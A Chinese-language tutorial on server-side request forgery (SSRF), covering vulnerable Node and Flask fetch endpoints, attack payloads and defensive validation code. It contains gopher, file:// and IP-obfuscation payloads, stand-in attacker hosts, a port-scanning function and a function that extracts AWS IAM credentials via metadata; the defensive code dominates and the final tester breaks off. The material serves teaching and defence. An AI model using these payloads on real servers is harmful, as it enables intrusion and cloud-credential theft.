---
title: SSRF 服务端请求伪造
description: 了解SSRF漏洞和防护措施
track: security
section: web-security
difficulty: intermediate
tags:
  - SSRF
  - 漏洞
  - Web安全
  - 防护
status: imported
origin: old/src/content/docs/security/ssrf.zh.md
divergence: 0.192
issues: []
legacy:
  category: Security
  subcategory: Web Security
  order: 23
  lastUpdated: 2026-01-07
---

SSRF（Server-Side Request Forgery，服务端请求伪造）是一种严重的 Web 安全漏洞，攻击者可以利用服务器作为代理，向内部网络或外部系统发起恶意请求。由于请求来自服务器本身，通常可以绑过防火墙和访问控制策略，访问到原本无法直接触达的内部资源。

## 什么是 SSRF

### SSRF 基本概念

SSRF 漏洞的核心问题在于服务器端应用程序接受用户提供的 URL 或主机信息，并据此发起请求，而没有对目标地址进行充分验证。

```
┌─────────────────────────────────────────────────────────────┐
│                    SSRF 攻击流程                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   攻击者                 Web服务器              内部网络       │
│     │                       │                     │         │
│     │ 1.发送恶意URL         │                     │         │
│     │───────────────────────>│                     │         │
│     │                       │ 2.服务器发起请求     │         │
│     │                       │────────────────────>│         │
│     │                       │                     │         │
│     │                       │ 3.返回内部数据       │         │
│     │                       │<────────────────────│         │
│     │ 4.泄露敏感信息        │                     │         │
│     │<───────────────────────│                     │         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 常见的存在 SSRF 漏洞的功能

```
┌─────────────────────────────────────────────────────────────┐
│                 容易出现 SSRF 的功能场景                      │
├─────────────────────────────────────────────────────────────┤
│  URL 预览/抓取    │  获取远程网页内容、生成缩略图              │
│  Webhook 功能    │  向用户指定的 URL 发送通知                 │
│  文件导入        │  从 URL 导入文件、RSS 订阅                 │
│  PDF 生成器      │  将 URL 内容转换为 PDF                     │
│  图片处理        │  远程图片裁剪、水印添加                    │
│  代理服务        │  反向代理、API 网关                        │
│  OAuth 回调      │  第三方认证回调地址                        │
└─────────────────────────────────────────────────────────────┘
```

### 漏洞代码示例

```javascript
// 存在 SSRF 漏洞的代码示例
const axios = require('axios');
const express = require('express');
const app = express();

// 漏洞代码：直接使用用户提供的 URL
app.get('/fetch', async (req, res) => {
  const { url } = req.query;

  try {
    // 危险：未经验证直接请求用户提供的 URL
    const response = await axios.get(url);
    res.json({ data: response.data });
  } catch (error) {
    res.status(500).json({ error: '请求失败' });
  }
});

// 攻击者可以这样利用：
// /fetch?url=http://localhost/admin
// /fetch?url=http://169.254.169.254/latest/meta-data/
// /fetch?url=file:///etc/passwd
```

```python
# Python Flask 漏洞示例
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/preview')
def preview():
    url = request.args.get('url')
    # 危险：直接请求用户输入的 URL
    response = requests.get(url)
    return response.text
```

## SSRF 攻击向量

### 常见攻击目标

```
┌─────────────────────────────────────────────────────────────┐
│                    SSRF 攻击目标分类                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 内部服务                                                 │
│     - http://localhost:8080/admin                          │
│     - http://127.0.0.1:6379/ (Redis)                       │
│     - http://192.168.1.1/router-admin                      │
│                                                             │
│  2. 云服务元数据                                             │
│     - AWS: http://169.254.169.254/latest/meta-data/        │
│     - GCP: http://metadata.google.internal/                │
│     - Azure: http://169.254.169.254/metadata/              │
│                                                             │
│  3. 内网服务                                                 │
│     - http://10.0.0.1/                                     │
│     - http://172.16.0.1/                                   │
│     - http://192.168.0.1/                                  │
│                                                             │
│  4. 其他协议                                                 │
│     - file:///etc/passwd                                   │
│     - gopher://localhost:6379/_*1%0d%0a...                 │
│     - dict://localhost:11211/stats                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 协议利用

SSRF 攻击不仅限于 HTTP 协议，还可以利用多种协议：

```javascript
// 各种协议的 SSRF 攻击载荷示例（仅用于教育目的）
const ssrfPayloads = {
  // HTTP/HTTPS - 最常见
  http: 'http://internal-server/admin',

  // File 协议 - 读取本地文件
  file: 'file:///etc/passwd',
  fileWindows: 'file:///C:/Windows/win.ini',

  // Gopher 协议 - 可以发送任意 TCP 数据
  // 常用于攻击 Redis、Memcached 等服务
  gopher: 'gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a',

  // Dict 协议 - 探测服务
  dict: 'dict://localhost:11211/stats',

  // LDAP 协议
  ldap: 'ldap://localhost:389/dc=example,dc=com',

  // FTP 协议
  ftp: 'ftp://localhost:21/'
};
```

### IP 地址绕过技术

攻击者常使用各种技术绑过 IP 地址黑名单：

```javascript
// IP 地址绕过技术示例（仅用于安全测试和教育目的）
const bypassTechniques = {
  // 1. 不同的 localhost 表示方法
  localhost: [
    'http://localhost/',
    'http://127.0.0.1/',
    'http://127.1/',
    'http://127.0.1/',
    'http://0.0.0.0/',
    'http://0/',
    'http://[::1]/',                    // IPv6
    'http://[0:0:0:0:0:0:0:1]/',        // IPv6 完整形式
    'http://127.0.0.1.nip.io/',         // DNS 重绑定
    'http://localtest.me/',              // 解析到 127.0.0.1 的域名
  ],

  // 2. 十进制/十六进制/八进制表示
  ipFormats: [
    'http://2130706433/',               // 127.0.0.1 的十进制
    'http://0x7f000001/',               // 十六进制
    'http://017700000001/',             // 八进制
    'http://0x7f.0x0.0x0.0x1/',         // 混合十六进制
  ],

  // 3. URL 编码绕过
  urlEncoding: [
    'http://127.0.0.1%00@evil.com/',    // NULL 字节
    'http://evil.com@127.0.0.1/',       // @ 符号混淆
    'http://127.0.0.1#@evil.com/',      // 片段标识符
  ],

  // 4. DNS 重绑定
  dnsRebinding: 'http://attacker-controlled.com/',  // 先解析到正常 IP，再解析到内网 IP

  // 5. 重定向绕过
  redirect: 'http://evil.com/redirect?to=http://127.0.0.1/'
};
```

## Blind SSRF（盲 SSRF）

### 什么是 Blind SSRF

盲 SSRF 是指攻击者无法直接看到服务器请求的响应内容，但仍然可以通过其他方式确认漏洞存在并进行利用。

```
┌─────────────────────────────────────────────────────────────┐
│              Blind SSRF vs 普通 SSRF                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  普通 SSRF:                                                  │
│  - 攻击者可以看到请求的响应内容                               │
│  - 可以直接读取内部服务数据                                   │
│                                                             │
│  Blind SSRF:                                                │
│  - 攻击者看不到响应内容                                      │
│  - 需要通过带外技术确认漏洞                                  │
│  - 利用难度更高，但仍然危险                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Blind SSRF 检测方法

```javascript
// Blind SSRF 检测技术

// 1. 时间延迟检测
// 请求一个响应很慢的内部服务，观察响应时间变化
const timeBasedPayloads = [
  'http://10.0.0.1:22/',        // SSH 端口，通常会有延迟
  'http://10.0.0.1:25/',        // SMTP 端口
  'http://169.254.169.254/'     // 云元数据服务
];

// 2. 带外数据获取（Out-of-Band）
// 使用攻击者控制的服务器接收回调
const oobPayloads = [
  'http://attacker.com/callback?data=test',
  'http://uniqueid.burpcollaborator.net/',
  'http://uniqueid.oast.pro/'
];

// 3. DNS 查询检测
// 观察是否有来自目标服务器的 DNS 查询
const dnsPayloads = [
  'http://uniqueid.attacker.com/',  // 自建 DNS 服务器记录查询
  'http://test.uniqueid.ceye.io/'   // 使用 DNSLog 平台
];
```

### Blind SSRF 利用场景

```javascript
// Blind SSRF 实际利用示例

// 场景 1：端口扫描
async function portScan(baseUrl, targetIp, ports) {
  const results = [];

  for (const port of ports) {
    const startTime = Date.now();
    try {
      // 通过响应时间判断端口状态
      await fetch(`${baseUrl}/fetch?url=http://${targetIp}:${port}/`);
      const elapsed = Date.now() - startTime;

      results.push({
        port,
        status: elapsed < 1000 ? 'open' : 'filtered',
        responseTime: elapsed
      });
    } catch (e) {
      results.push({ port, status: 'closed' });
    }
  }

  return results;
}

// 场景 2：内网服务发现
const internalRanges = [
  '10.0.0.',
  '172.16.0.',
  '192.168.1.'
];

// 场景 3：结合其他漏洞
// Blind SSRF + Redis 未授权访问 = RCE
const redisPayload = `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$4%0d%0atest%0d%0a`;
```

## 云元数据利用

### 云服务元数据接口

云环境中的 SSRF 漏洞尤其危险，因为可以访问实例元数据获取敏感凭证。

```
┌─────────────────────────────────────────────────────────────┐
│                    云元数据服务地址                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  AWS EC2:                                                   │
│  http://169.254.169.254/latest/meta-data/                  │
│  http://169.254.169.254/latest/user-data/                  │
│  http://169.254.169.254/latest/meta-data/iam/              │
│                                                             │
│  Google Cloud:                                              │
│  http://metadata.google.internal/computeMetadata/v1/       │
│  http://169.254.169.254/computeMetadata/v1/                │
│  (需要 Header: Metadata-Flavor: Google)                     │
│                                                             │
│  Azure:                                                     │
│  http://169.254.169.254/metadata/instance                  │
│  http://169.254.169.254/metadata/identity/oauth2/token     │
│  (需要 Header: Metadata: true)                             │
│                                                             │
│  DigitalOcean:                                              │
│  http://169.254.169.254/metadata/v1/                       │
│                                                             │
│  Alibaba Cloud:                                             │
│  http://100.100.100.200/latest/meta-data/                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### AWS 元数据利用

```javascript
// AWS 元数据获取示例（仅用于安全测试）
const awsMetadataEndpoints = {
  // 基础信息
  instanceId: 'http://169.254.169.254/latest/meta-data/instance-id',
  availabilityZone: 'http://169.254.169.254/latest/meta-data/placement/availability-zone',
  localIpv4: 'http://169.254.169.254/latest/meta-data/local-ipv4',
  publicIpv4: 'http://169.254.169.254/latest/meta-data/public-ipv4',

  // IAM 凭证（最危险）
  iamRole: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  // 获取到角色名后，可以获取临时凭证
  // http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

  // 用户数据（可能包含敏感信息）
  userData: 'http://169.254.169.254/latest/user-data',

  // AWS IMDSv2 需要 Token
  // Step 1: 获取 Token
  tokenEndpoint: 'http://169.254.169.254/latest/api/token',
  // PUT 请求，Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

  // Step 2: 使用 Token 访问元数据
  // Header: X-aws-ec2-metadata-token: <token>
};

// 攻击场景：通过 SSRF 获取 AWS 临时凭证
async function exploitAWSMetadata(ssrfEndpoint) {
  // 1. 获取 IAM 角色名
  const rolesUrl = `${ssrfEndpoint}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
  const roleResponse = await fetch(rolesUrl);
  const roleName = await roleResponse.text();

  // 2. 获取临时凭证
  const credsUrl = `${ssrfEndpoint}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`;
  const credsResponse = await fetch(credsUrl);
  const credentials = await credsResponse.json();

  // 返回的凭证包含：
  // - AccessKeyId
  // - SecretAccessKey
  // - Token
  // - Expiration

  return credentials;
}
```

### GCP 元数据利用

```javascript
// GCP 元数据获取（需要特定 Header）
const gcpMetadataEndpoints = {
  // 项目信息
  projectId: 'http://metadata.google.internal/computeMetadata/v1/project/project-id',

  // 实例信息
  instanceName: 'http://metadata.google.internal/computeMetadata/v1/instance/name',
  zone: 'http://metadata.google.internal/computeMetadata/v1/instance/zone',

  // Service Account 访问令牌（最危险）
  accessToken: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',

  // SSH 密钥
  sshKeys: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys'
};

// GCP 需要添加 Metadata-Flavor: Google Header
// 如果 SSRF 漏洞允许设置自定义 Header，才能成功利用
```

## SSRF 防护措施

### URL 验证类

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

class SSRFProtection {
  constructor(options = {}) {
    // 配置选项
    this.allowedProtocols = options.allowedProtocols || ['http:', 'https:'];
    this.allowedPorts = options.allowedPorts || [80, 443, 8080, 8443];
    this.allowedDomains = options.allowedDomains || null; // null 表示不限制
    this.blockedDomains = options.blockedDomains || [];
    this.timeout = options.timeout || 5000;

    // 私有 IP 范围
    this.blockedIPRanges = [
      'loopback',      // 127.0.0.0/8
      'private',       // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
      'linkLocal',     // 169.254.0.0/16 (包含云元数据地址)
      'broadcast',     // 255.255.255.255
      'unspecified'    // 0.0.0.0
    ];

    // 特殊的云元数据 IP
    this.metadataIPs = [
      '169.254.169.254',   // AWS/GCP/Azure
      '100.100.100.200',   // Alibaba Cloud
      'metadata.google.internal',
      'metadata.gcp.internal'
    ];
  }

  // 验证 URL 格式
  parseAndValidateUrl(urlString) {
    let parsedUrl;

    try {
      parsedUrl = new URL(urlString);
    } catch (e) {
      throw new Error('URL 格式无效');
    }

    return parsedUrl;
  }

  // 验证协议
  validateProtocol(parsedUrl) {
    if (!this.allowedProtocols.includes(parsedUrl.protocol)) {
      throw new Error(`不允许的协议: ${parsedUrl.protocol}`);
    }
  }

  // 验证端口
  validatePort(parsedUrl) {
    const port = parsedUrl.port ||
      (parsedUrl.protocol === 'https:' ? 443 : 80);

    if (!this.allowedPorts.includes(parseInt(port))) {
      throw new Error(`不允许的端口: ${port}`);
    }
  }

  // 验证域名
  validateDomain(hostname) {
    // 检查是否在黑名单中
    if (this.blockedDomains.some(d => hostname.endsWith(d))) {
      throw new Error('域名在黑名单中');
    }

    // 检查白名单
    if (this.allowedDomains &&
        !this.allowedDomains.some(d => hostname.endsWith(d))) {
      throw new Error('域名不在白名单中');
    }

    // 检查是否是元数据域名
    if (this.metadataIPs.includes(hostname.toLowerCase())) {
      throw new Error('禁止访问元数据服务');
    }
  }

  // 验证 IP 地址
  isIPSafe(ip) {
    try {
      const addr = ipaddr.parse(ip);
      const range = addr.range();

      // 检查是否在阻止的范围内
      if (this.blockedIPRanges.includes(range)) {
        return false;
      }

      // 检查是否是元数据 IP
      if (this.metadataIPs.includes(ip)) {
        return false;
      }

      return true;
    } catch (e) {
      return false;
    }
  }

  // DNS 解析并验证
  async resolveDNS(hostname) {
    // 如果输入的是 IP 地址，直接验证
    if (ipaddr.isValid(hostname)) {
      if (!this.isIPSafe(hostname)) {
        throw new Error('目标 IP 地址不安全');
      }
      return [hostname];
    }

    // 解析域名
    const addresses = [];

    try {
      const ipv4Addresses = await dns.resolve4(hostname);
      addresses.push(...ipv4Addresses);
    } catch (e) {
      // IPv4 解析失败，继续尝试 IPv6
    }

    try {
      const ipv6Addresses = await dns.resolve6(hostname);
      addresses.push(...ipv6Addresses);
    } catch (e) {
      // IPv6 解析失败
    }

    if (addresses.length === 0) {
      throw new Error('无法解析域名');
    }

    // 验证所有解析到的 IP
    for (const ip of addresses) {
      if (!this.isIPSafe(ip)) {
        throw new Error(`解析到不安全的 IP 地址: ${ip}`);
      }
    }

    return addresses;
  }

  // 完整的 URL 验证
  async validateUrl(urlString) {
    // 1. 解析 URL
    const parsedUrl = this.parseAndValidateUrl(urlString);

    // 2. 验证协议
    this.validateProtocol(parsedUrl);

    // 3. 验证端口
    this.validatePort(parsedUrl);

    // 4. 验证域名
    this.validateDomain(parsedUrl.hostname);

    // 5. DNS 解析并验证 IP
    await this.resolveDNS(parsedUrl.hostname);

    return parsedUrl;
  }
}

// 使用示例
const ssrfProtection = new SSRFProtection({
  allowedDomains: ['example.com', 'api.trusted.com'],
  allowedPorts: [80, 443]
});

module.exports = SSRFProtection;
```

### 安全的请求发送

```javascript
const axios = require('axios');
const SSRFProtection = require('./ssrf-protection');

class SafeHttpClient {
  constructor() {
    this.ssrfProtection = new SSRFProtection();
    this.maxRedirects = 0;  // 禁止重定向
    this.timeout = 5000;
    this.maxResponseSize = 10 * 1024 * 1024; // 10MB
  }

  async fetch(url, options = {}) {
    // 1. 验证 URL
    const validatedUrl = await this.ssrfProtection.validateUrl(url);

    // 2. 配置安全的请求选项
    const safeOptions = {
      ...options,
      timeout: this.timeout,
      maxRedirects: this.maxRedirects,
      validateStatus: (status) => status < 400,
      maxContentLength: this.maxResponseSize,
      maxBodyLength: this.maxResponseSize,

      // 不发送可能泄露信息的 Header
      headers: {
        'User-Agent': 'SafeBot/1.0',
        ...options.headers
      },

      // 禁止发送 Cookie
      withCredentials: false
    };

    // 3. 发起请求
    try {
      const response = await axios.get(validatedUrl.href, safeOptions);
      return response;
    } catch (error) {
      // 处理重定向（手动验证重定向目标）
      if (error.response &&
          [301, 302, 303, 307, 308].includes(error.response.status)) {
        throw new Error('不允许重定向');
      }
      throw error;
    }
  }

  // 安全地处理重定向
  async fetchWithSafeRedirects(url, maxRedirects = 3) {
    let currentUrl = url;
    let redirectCount = 0;

    while (redirectCount <= maxRedirects) {
      // 验证当前 URL
      await this.ssrfProtection.validateUrl(currentUrl);

      const response = await axios.get(currentUrl, {
        timeout: this.timeout,
        maxRedirects: 0,
        validateStatus: () => true
      });

      // 检查是否需要重定向
      if ([301, 302, 303, 307, 308].includes(response.status)) {
        const redirectUrl = response.headers.location;

        if (!redirectUrl) {
          throw new Error('重定向响应缺少 Location 头');
        }

        // 验证重定向目标
        currentUrl = new URL(redirectUrl, currentUrl).href;
        redirectCount++;
        continue;
      }

      return response;
    }

    throw new Error('重定向次数过多');
  }
}

// Express 中间件示例
const express = require('express');
const app = express();

const safeClient = new SafeHttpClient();

app.get('/fetch', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: '缺少 URL 参数' });
  }

  try {
    const response = await safeClient.fetch(url);
    res.json({
      data: response.data,
      contentType: response.headers['content-type']
    });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### 防止 DNS 重绑定攻击

```javascript
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

class DNSRebindingProtection {
  constructor() {
    this.resolvedIPs = new Map();
    this.cacheTTL = 60000; // 1分钟
  }

  // 在请求前后都验证 DNS
  async validateDNS(hostname) {
    // 第一次解析
    const firstResolve = await this.resolveDNS(hostname);
    this.validateIPs(firstResolve, hostname);

    // 缓存解析结果
    this.resolvedIPs.set(hostname, {
      ips: firstResolve,
      timestamp: Date.now()
    });

    return firstResolve;
  }

  // 在请求后验证 DNS 是否变化
  async verifyDNSAfterRequest(hostname) {
    const cached = this.resolvedIPs.get(hostname);
    if (!cached) return;

    // 再次解析
    const secondResolve = await this.resolveDNS(hostname);

    // 检查 IP 是否变化
    const newIPs = secondResolve.filter(ip => !cached.ips.includes(ip));

    if (newIPs.length > 0) {
      // 验证新的 IP
      this.validateIPs(newIPs, hostname);
    }
  }

  async resolveDNS(hostname) {
    const addresses = [];

    try {
      const ipv4 = await dns.resolve4(hostname);
      addresses.push(...ipv4);
    } catch (e) {}

    try {
      const ipv6 = await dns.resolve6(hostname);
      addresses.push(...ipv6);
    } catch (e) {}

    return addresses;
  }

  validateIPs(ips, hostname) {
    for (const ip of ips) {
      const addr = ipaddr.parse(ip);
      const range = addr.range();

      if (['loopback', 'private', 'linkLocal'].includes(range)) {
        throw new Error(
          `DNS 重绑定检测: ${hostname} 解析到私有 IP ${ip}`
        );
      }
    }
  }
}

// 使用连接时 IP 固定的方式防止 DNS 重绑定
const http = require('http');
const https = require('https');

async function fetchWithFixedIP(url) {
  const parsedUrl = new URL(url);

  // 1. 解析并验证 DNS
  const addresses = await dns.resolve4(parsedUrl.hostname);

  // 验证 IP
  for (const ip of addresses) {
    const addr = ipaddr.parse(ip);
    if (['loopback', 'private', 'linkLocal'].includes(addr.range())) {
      throw new Error('不允许访问内部 IP');
    }
  }

  // 2. 使用解析到的 IP 直接连接
  const targetIP = addresses[0];

  const options = {
    hostname: targetIP,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    path: parsedUrl.pathname + parsedUrl.search,
    method: 'GET',
    headers: {
      'Host': parsedUrl.hostname  // 保留原始 Host 头
    }
  };

  // 使用固定 IP 发起请求
  return new Promise((resolve, reject) => {
    const protocol = parsedUrl.protocol === 'https:' ? https : http;

    const req = protocol.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, data }));
    });

    req.on('error', reject);
    req.end();
  });
}
```

### 网络层防护

```javascript
// 使用 iptables 限制出站流量（Linux 系统）
// 应在服务器层面配置，以下为示例命令

const networkRestrictions = `
# 禁止访问云元数据服务
iptables -A OUTPUT -d 169.254.169.254 -j DROP
iptables -A OUTPUT -d 100.100.100.200 -j DROP

# 禁止应用访问内网
iptables -A OUTPUT -d 10.0.0.0/8 -m owner --uid-owner www-data -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -m owner --uid-owner www-data -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -m owner --uid-owner www-data -j DROP

# 或使用更细粒度的控制
# 只允许应用访问特定外部服务
iptables -A OUTPUT -d api.example.com -m owner --uid-owner www-data -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner www-data -j DROP
`;

// AWS VPC 端点策略限制元数据访问
const awsImdsPolicy = {
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "ec2:osuser": "www-data"
        }
      }
    }
  ]
};

// 强制使用 IMDSv2（需要 Token）
// 在 EC2 实例启动时配置
const ec2Config = {
  "MetadataOptions": {
    "HttpTokens": "required",  // 强制使用 IMDSv2
    "HttpPutResponseHopLimit": 1,
    "HttpEndpoint": "enabled"
  }
};
```

## 安全的 URL 验证最佳实践

### 完整的防护方案

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');
const axios = require('axios');

class SecureURLFetcher {
  constructor(config = {}) {
    // 白名单模式（最安全）
    this.allowedDomains = config.allowedDomains || [];
    this.allowedProtocols = config.allowedProtocols || ['https:'];
    this.allowedPorts = config.allowedPorts || [443];

    // 请求配置
    this.timeout = config.timeout || 5000;
    this.maxResponseSize = config.maxResponseSize || 5 * 1024 * 1024;

    // 私有 IP 检查
    this.privateRanges = [
      '10.0.0.0/8',
      '172.16.0.0/12',
      '192.168.0.0/16',
      '127.0.0.0/8',
      '169.254.0.0/16',
      '100.64.0.0/10',  // CGNAT
      'fc00::/7',       // IPv6 私有
      '::1/128'         // IPv6 localhost
    ];
  }

  // 综合验证
  async validate(urlString) {
    const errors = [];

    // 1. URL 格式验证
    let parsedUrl;
    try {
      parsedUrl = new URL(urlString);
    } catch (e) {
      return { valid: false, errors: ['URL 格式无效'] };
    }

    // 2. 协议检查
    if (!this.allowedProtocols.includes(parsedUrl.protocol)) {
      errors.push(`协议 ${parsedUrl.protocol} 不被允许`);
    }

    // 3. 端口检查
    const port = parseInt(parsedUrl.port) ||
      (parsedUrl.protocol === 'https:' ? 443 : 80);
    if (!this.allowedPorts.includes(port)) {
      errors.push(`端口 ${port} 不被允许`);
    }

    // 4. 域名白名单检查
    if (this.allowedDomains.length > 0) {
      const domainAllowed = this.allowedDomains.some(allowed =>
        parsedUrl.hostname === allowed ||
        parsedUrl.hostname.endsWith('.' + allowed)
      );
      if (!domainAllowed) {
        errors.push('域名不在白名单中');
      }
    }

    // 5. DNS 解析和 IP 验证
    try {
      const ips = await this.resolveAndValidateIPs(parsedUrl.hostname);
      if (ips.length === 0) {
        errors.push('无法解析域名');
      }
    } catch (e) {
      errors.push(e.message);
    }

    // 6. URL 混淆检测
    if (this.hasUrlConfusion(urlString)) {
      errors.push('检测到 URL 混淆攻击');
    }

    return {
      valid: errors.length === 0,
      errors,
      parsedUrl: errors.length === 0 ? parsedUrl : null
    };
  }

  // 解析并验证 IP
  async resolveAndValidateIPs(hostname) {
    // 如果直接是 IP
    if (ipaddr.isValid(hostname)) {
      this.validateIP(hostname);
      return [hostname];
    }

    // DNS 解析
    const ips = [];

    try {
      const ipv4 = await dns.resolve4(hostname);
      ips.push(...ipv4);
    } catch (e) {}

    try {
      const ipv6 = await dns.resolve6(hostname);
      ips.push(...ipv6);
    } catch (e) {}

    // 验证每个 IP
    for (const ip of ips) {
      this.validateIP(ip);
    }

    return ips;
  }

  // 验证单个 IP
  validateIP(ip) {
    const addr = ipaddr.parse(ip);

    // 检查是否是私有 IP
    for (const range of this.privateRanges) {
      const [network, prefix] = range.split('/');
      try {
        const networkAddr = ipaddr.parse(network);
        if (addr.match(networkAddr, parseInt(prefix))) {
          throw new Error(`IP ${ip} 是私有地址`);
        }
      } catch (e) {
        if (e.message.includes('私有地址')) {
          throw e;
        }
      }
    }

    // 检查特殊地址
    const specialIPs = [
      '169.254.169.254',  // Cloud metadata
      '100.100.100.200',  // Alibaba Cloud metadata
    ];

    if (specialIPs.includes(ip)) {
      throw new Error(`禁止访问特殊 IP: ${ip}`);
    }
  }

  // 检测 URL 混淆
  hasUrlConfusion(url) {
    // 检查常见的混淆模式
    const confusionPatterns = [
      /@.*@/,                    // 多个 @ 符号
      /\\x[0-9a-f]{2}/i,        // 十六进制编码
      /\x00/,                    // NULL 字节
      /\s/,                      // 空白字符
      /%00/,                     // 编码的 NULL
      /\/\//.*\/\//,             // 多个 //
    ];

    return confusionPatterns.some(pattern => pattern.test(url));
  }

  // 安全发起请求
  async fetch(url) {
    // 1. 验证 URL
    const validation = await this.validate(url);
    if (!validation.valid) {
      throw new Error(`URL 验证失败: ${validation.errors.join(', ')}`);
    }

    // 2. 发起请求
    const response = await axios.get(validation.parsedUrl.href, {
      timeout: this.timeout,
      maxRedirects: 0,
      maxContentLength: this.maxResponseSize,
      headers: {
        'User-Agent': 'SecureBot/1.0'
      },
      validateStatus: status => status < 400
    });

    return response.data;
  }
}

// 使用示例
const fetcher = new SecureURLFetcher({
  allowedDomains: ['github.com', 'api.github.com'],
  allowedProtocols: ['https:'],
  allowedPorts: [443]
});

// Express 路由
app.get('/preview', async (req, res) => {
  try {
    const data = await fetcher.fetch(req.query.url);
    res.json({ data });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### Webhook 安全实现

```javascript
class SecureWebhook {
  constructor() {
    this.maxRetries = 3;
    this.retryDelay = 1000;
    this.timeout = 10000;

    // 验证器
    this.urlFetcher = new SecureURLFetcher({
      allowedProtocols: ['https:'],
      allowedPorts: [443, 8443]
    });
  }

  // 注册 Webhook 时验证 URL
  async registerWebhook(userId, callbackUrl) {
    // 1. 验证 URL 格式和安全性
    const validation = await this.urlFetcher.validate(callbackUrl);
    if (!validation.valid) {
      throw new Error(`Webhook URL 无效: ${validation.errors.join(', ')}`);
    }

    // 2. 验证 URL 可达性（可选）
    try {
      await axios.head(callbackUrl, {
        timeout: 5000,
        maxRedirects: 0
      });
    } catch (e) {
      throw new Error('Webhook URL 不可达');
    }

    // 3. 存储 Webhook
    await db.webhooks.create({
      userId,
      url: callbackUrl,
      secret: this.generateSecret(),
      createdAt: new Date()
    });
  }

  // 发送 Webhook 通知
  async sendNotification(webhookId, payload) {
    const webhook = await db.webhooks.findById(webhookId);
    if (!webhook) {
      throw new Error('Webhook 不存在');
    }

    // 重新验证 URL（防止注册后 DNS 变化）
    const validation = await this.urlFetcher.validate(webhook.url);
    if (!validation.valid) {
      await this.disableWebhook(webhookId, '安全验证失败');
      throw new Error('Webhook URL 安全验证失败');
    }

    // 签名
    const signature = this.sign(payload, webhook.secret);

    // 发送请求
    let lastError;
    for (let i = 0; i < this.maxRetries; i++) {
      try {
        await axios.post(webhook.url, payload, {
          timeout: this.timeout,
          maxRedirects: 0,
          headers: {
            'Content-Type': 'application/json',
            'X-Webhook-Signature': signature,
            'X-Webhook-Timestamp': Date.now().toString()
          }
        });

        // 记录成功
        await this.logDelivery(webhookId, 'success');
        return;
      } catch (error) {
        lastError = error;
        await this.sleep(this.retryDelay * (i + 1));
      }
    }

    // 记录失败
    await this.logDelivery(webhookId, 'failed', lastError.message);
    throw lastError;
  }

  generateSecret() {
    return require('crypto').randomBytes(32).toString('hex');
  }

  sign(payload, secret) {
    const crypto = require('crypto');
    return crypto
      .createHmac('sha256', secret)
      .update(JSON.stringify(payload))
      .digest('hex');
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
```

## 检测与测试

### SSRF 漏洞检测清单

```markdown
## SSRF 安全检查清单

### 代码审查
- [ ] 检查所有接受 URL 参数的接口
- [ ] 检查是否使用了用户输入构造请求
- [ ] 检查重定向处理逻辑
- [ ] 检查是否有 URL 验证逻辑

### 功能测试
- [ ] 测试 localhost/127.0.0.1 访问
- [ ] 测试内网 IP 范围 (10.x, 172.16.x, 192.168.x)
- [ ] 测试云元数据地址 (169.254.169.254)
- [ ] 测试 file:// 协议
- [ ] 测试 IP 地址各种编码形式
- [ ] 测试 DNS 重绑定
- [ ] 测试开放重定向链

### 配置检查
- [ ] 检查出站网络策略
- [ ] 检查 DNS 服务器配置
- [ ] 检查云实例元数据保护配置
- [ ] 检查 WAF 规则
```

### 自动化测试脚本

```javascript
// SSRF 漏洞测试工具（仅用于授权测试）
class SSRFTester {
  constructor(targetEndpoint) {
    this.endpoint = targetEndpoint;
    this.results = [];
  }

  // 测试各种 SSRF 载荷
  async runTests() {
    const payloads = [
      // localhost 变体
      { name: 'localhost', url: 'http://localhost/' },
      { name: '127.0.0.1', url: 'http://127.0.0.1/' },
      { name: '127.1', url: 'http://127.1/' },
      { name: '[::1]', url: 'http://[::1]/' },

      // 十进制 IP
      { name: 'Decimal IP', url: 'http://2130706433/' },

      // 内网 IP
      { name: '10.0.0.1', url: 'http://10.0.0.1/' },
      { name: '172.16.0.1', url: 'http://172.16.0.1/' },
      { name: '192.168.1.1', url: 'http://192.168.1.1/' },

      // 云元数据
      { name: 'AWS Metadata', url: 'http://169.254.169.254/' },
      { name: 'GCP Metadata', url: 'http://metadata.google.internal/' },

      // 其他协议
      { name: 'File Protocol', url: 'file:///etc/passwd' },
      { name: 'Gopher Protocol', url: 'gopher://localhost:6379/' },

      // URL 混淆
      { name: 'URL Confusion', url: 'http://evil.com@localhost/' },
      { name: 'Encoded URL', url: 'http://127.0.0.1%00@evil.com/' }
    ];

